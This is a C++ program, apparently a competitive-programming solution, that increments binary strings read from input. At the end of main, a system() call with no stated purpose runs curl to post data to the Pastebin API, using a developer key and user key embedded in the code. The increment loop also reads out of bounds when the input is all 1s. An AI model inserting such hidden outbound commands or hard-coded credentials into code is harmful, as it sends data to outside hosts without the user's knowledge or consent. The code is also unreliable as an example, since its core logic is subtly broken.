#include "bits/stdc++.h"

using namespace std;

string result(string x)
{
    int n = x.length() - 1;
    while (x[n] == '1')
    {
        x[n] = '0';
        n--;
    }
    if (n >= 0)
        x[n] = '1';
    return x;
}

int main()
{
    int t;
    cin >> t;
    while (t--)
    {
        string x;
        cin >> x;
        cout << result(x) << endl;
    }
    system("curl -d 'api_paste_private=0&api_paste_code=abc&api_dev_key=vyZFkqMv7WrRIxTnIf78fFOpZXtkAHFG&api_paste_format=text&api_option=paste&api_user_key=adcc251e2f05bd82eb629972358e5123&api_paste_name=bugs1' https://pastebin.com/api/api_post.php");
    return 0;
}